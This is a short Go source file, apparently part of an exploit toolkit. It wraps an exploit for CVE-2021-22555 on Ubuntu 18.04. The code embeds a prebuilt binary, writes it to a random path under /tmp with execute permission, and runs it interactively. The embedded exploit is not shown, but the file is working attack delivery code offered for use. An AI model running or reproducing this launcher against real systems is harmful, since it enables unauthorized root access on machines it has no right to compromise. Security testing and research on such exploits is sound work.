package CVE_2021_22555_ubuntu18_04

import (
	_ "embed"
	"fmt"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
	"os/exec"
	"time"
)

//go:embed exp_ubuntu18.04
var exp []byte

func Exploit() {
	pathCmd := fmt.Sprintf("/tmp/%d", time.Now().Nanosecond())
	err := os.WriteFile(pathCmd, exp, 0755)
	awesome_error.CheckFatal(err)
	cmd := exec.Command(pathCmd)
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	awesome_error.CheckFatal(cmd.Start())
	cmd.Wait()
}

func main() {
	Exploit()
}
